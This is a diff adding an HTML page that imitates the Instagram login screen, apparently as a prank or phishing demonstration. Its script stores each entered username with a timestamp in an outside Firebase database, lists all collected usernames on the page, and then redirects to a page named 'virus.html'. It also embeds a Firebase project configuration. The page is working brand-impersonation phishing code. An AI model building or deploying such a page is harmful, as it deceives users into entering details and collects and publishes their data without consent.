@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+            background-color: #f6f6f6;
+        }
+        .login-form {
+            max-width: 300px;
+            margin: 100px auto 0;
+            border: 1px solid #ccc;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-form input {
+            display: block;
+            width: 80%;
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .login-form button {
+            padding: 10px;
+            background-color: #000000;
+            border: none;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 80%;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .header-left img {
+            margin-right: 20px;
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+        }
+        .stats {
+            margin: 20px auto;
+            max-width: 300px;
+            text-align: left;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .stats p {
+            margin: 0;
+        }
+    </style>
+    <!-- Firebase SDKs -->
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
+      import { getDatabase, ref, set, push, get, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+    apiKey: "AIzaSyAdWdGnmcOdsTyX_El7CsU0KWQAKX_UDL4",
+    authDomain: "abiganteng-f7c16.firebaseapp.com",
+    databaseURL: "https://abiganteng-f7c16-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "abiganteng-f7c16",
+    storageBucket: "abiganteng-f7c16.appspot.com",
+    messagingSenderId: "233524290022",
+    appId: "1:233524290022:web:fe8f604cf0ccc1043b3627",
+    measurementId: "G-YC8Y2NYXB2"
+  };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const database = getDatabase(app);
+
+      async function incrementLoginCount(username) {
+          const countRef = ref(database, 'login_count');
+          const countSnapshot = await get(countRef);
+          const currentCount = countSnapshot.val() || 0;
+          await set(countRef, currentCount + 1);
+
+          const loginsRef = push(ref(database, 'logins'));
+          await set(loginsRef, {
+              username: username,
+              timestamp: new Date().toISOString()
+          });
+      }
+
+      window.onload = function() {
+          const loginButton = document.getElementById('login-button');
+          loginButton.addEventListener('click', function(event) {
+              event.preventDefault();
+              const username = document.getElementById('username-input').value;
+              if (window.confirm("Apakah Anda yakin ingin login?")) {
+                  incrementLoginCount(username).then(() => {
+                      window.location.href = "virus.html";
+                  }).catch((error) => {
+                      console.error("Error updating count:", error);
+                  });
+              } else {
+                  alert("Selamat, Anda terhindar dari virus");
+              }
+          });
+
+          // Update login count display
+          const countRef = ref(database, 'login_count');
+          onValue(countRef, (snapshot) => {
+              const count = snapshot.val();
+              document.getElementById('login-count').textContent = count || 0;
+          });
+
+          // Update login list
+          const loginsRef = ref(database, 'logins');
+          onValue(loginsRef, (snapshot) => {
+              const loginList = document.getElementById('login-list');
+              loginList.innerHTML = '';
+              snapshot.forEach((childSnapshot) => {
+                  const login = childSnapshot.val();
+                  const listItem = document.createElement('li');
+                  listItem.textContent = `${login.username} logged in at ${login.timestamp}`;
+                  loginList.appendChild(listItem);
+              });
+          });
+      };
+    </script>
+</head>
+<body>
+    <header>
+        <div class="header-left">
+            <img src="logoinstagram.png" alt="Instagram Logo">
+        </div>
+        <h1>Instagram</h1>
+    </header>
+    <div class="login-form">
+        <input id="username-input" type="text" placeholder="Username" required>
+        <input type="password" placeholder="Password" required>
+        <button id="login-button">Log In</button>
+    </div>
+    <div class="stats">
+        <p>Login count: <span id="login-count">0</span></p>
+        <ul id="login-list"></ul>
+    </div>
+</body>
+</html>
